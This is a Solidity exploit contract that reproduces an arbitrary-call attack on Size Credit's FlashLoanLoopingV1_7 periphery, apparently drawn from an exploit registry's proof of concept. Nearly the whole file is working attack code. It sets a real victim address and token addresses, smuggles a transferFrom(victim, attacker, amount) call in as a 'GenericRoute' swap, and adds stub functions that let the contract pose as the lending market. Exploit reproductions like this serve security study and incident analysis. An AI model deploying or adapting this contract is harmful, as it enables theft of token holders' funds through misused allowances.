// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone, playground-safe reproduction of the Size Credit
// FlashLoanLoopingV1_7 GenericRoute arbitrary-call exploit
// (see evm-hack-registry/2025-08-SizeFlashLoanLooping_exp for the original
// Foundry PoC this mirrors). No forge-std / Test dependency: the real
// attack contract below never inherited Test either, so this is a faithful,
// minimal standalone copy - just the `SizeFlashLoanLoopingAttack` contract
// with a couple of local interfaces instead of the registry's giant
// interface.sol / basetest.sol helpers.
//
// Attack summary: the attacker calls Size's public, unguarded
// FlashLoanLoopingV1_7.loopPositionWithFlashLoan() with a SwapMethod.GenericRoute
// step whose `router` is a Pendle PT token and whose `data` is
// transferFrom(victim, attacker, amount). DexSwap._swapGenericRoute() forwards
// that (router, data) straight into `router.call(data)` executing with the
// periphery contract as msg.sender - so it spends the victim's PT allowance
// that had been granted to the periphery for legitimate zap operations.

address constant VICTIM = 0xaC47Ea87b634E0CAbcA5c291EaD7C1474668210d;
address constant FLASH_LOAN_LOOPING = 0x4b356Dc596dd508836bd9e8FE5aCad81F8Cf9019;
address constant PENDLE_PT = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant PT_AMOUNT = 540_576_557_356_106_541_792;
uint256 constant WETH_DUST = 10_000;

interface IERC20Min {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHMin {
    function deposit() external payable;
}

interface IFlashLoanLoopingV17 {
    enum SwapMethod {
        OneInch,
        Unoswap,
        UniswapV2,
        UniswapV3,
        GenericRoute,
        BoringPtSeller,
        BuyPt
    }

    struct SellCreditMarketParams {
        address lender;
        uint256 creditPositionId;
        uint256 amount;
        uint256 tenor;
        uint256 deadline;
        uint256 maxAPR;
        bool exactAmountIn;
    }

    struct SwapParams {
        SwapMethod method;
        bytes data;
    }

    struct LoopParamsV17 {
        address sizeMarket;
        address collateralToken;
        address borrowToken;
        uint256 flashLoanAmountBorrowToken;
        SellCreditMarketParams[] sellCreditMarketParamsArray;
        SwapParams[] swapParamsArray;
        uint256 targetLeveragePercent;
    }

    function loopPositionWithFlashLoan(LoopParamsV17 calldata loopParams) external;
}

contract SizeFlashLoanLoopingAttack {
    struct DepositParams {
        address token;
        uint256 amount;
        address to;
    }

    struct GenericRouteParams {
        address router;
        address tokenIn;
        bytes data;
    }

    receive() external payable {}

    function run() external {
        // Wrap a dust amount of ETH into WETH - only needed to populate the
        // GenericRoute's `tokenIn` field; the periphery's forceApprove(WETH,
        // router=PT, max) is a no-op since PT never spends that allowance.
        IWETHMin(payable(WETH_TOKEN)).deposit{value: WETH_DUST}();

        // The malicious "swap": router = the victim's PT token, data =
        // transferFrom(victim, attacker, amount). Executed by the periphery
        // via an unchecked low-level call, this pulls the victim's tokens
        // using the allowance they granted to the periphery.
        GenericRouteParams memory route = GenericRouteParams({
            router: PENDLE_PT,
            tokenIn: WETH_TOKEN,
            data: abi.encodeWithSelector(IERC20Min.transferFrom.selector, VICTIM, address(this), PT_AMOUNT)
        });

        IFlashLoanLoopingV17.SwapParams[] memory swaps = new IFlashLoanLoopingV17.SwapParams[](1);
        swaps[0] = IFlashLoanLoopingV17.SwapParams({
            method: IFlashLoanLoopingV17.SwapMethod.GenericRoute,
            data: abi.encode(route)
        });

        IFlashLoanLoopingV17.SellCreditMarketParams[] memory emptySellCreditParams =
            new IFlashLoanLoopingV17.SellCreditMarketParams[](0);

        // sizeMarket / collateralToken point at this contract so the
        // post-swap Size-market multicall + leverage check are trivially
        // satisfied by the stub functions below, and flashLoanAmountBorrowToken
        // = 0 means there is no real Aave debt to repay.
        IFlashLoanLoopingV17.LoopParamsV17 memory loopParams = IFlashLoanLoopingV17.LoopParamsV17({
            sizeMarket: address(this),
            collateralToken: address(this),
            borrowToken: WETH_TOKEN,
            flashLoanAmountBorrowToken: 0,
            sellCreditMarketParamsArray: emptySellCreditParams,
            swapParamsArray: swaps,
            targetLeveragePercent: 10_000
        });

        IFlashLoanLoopingV17(FLASH_LOAN_LOOPING).loopPositionWithFlashLoan(loopParams);
    }

    // --- stub surface so this contract can impersonate `sizeMarket` /
    // `collateralToken` / `borrowAToken` for the post-swap multicall the
    // periphery runs against the (attacker-controlled) Size market ---

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 10_000_000_000_000_000_000_000_000_000_000;
    }

    function multicall(bytes[] calldata calls) external pure returns (bytes[] memory results) {
        results = new bytes[](calls.length);
    }

    function data()
        external
        pure
        returns (
            uint256 nextDebtPositionId,
            uint256 nextCreditPositionId,
            address underlyingCollateralToken,
            address underlyingBorrowToken,
            address collateralToken,
            address borrowAToken,
            address debtToken,
            address variablePool
        )
    {
        nextDebtPositionId = 0;
        nextCreditPositionId = 0;
        underlyingCollateralToken = WETH_TOKEN;
        underlyingBorrowToken = WETH_TOKEN;
        collateralToken = WETH_TOKEN;
        borrowAToken = WETH_TOKEN;
        debtToken = WETH_TOKEN;
        variablePool = WETH_TOKEN;
    }

    function debtTokenAmountToCollateralTokenAmount(uint256) external pure returns (uint256) {
        return 10;
    }

    function deposit(DepositParams calldata) external payable {}
}
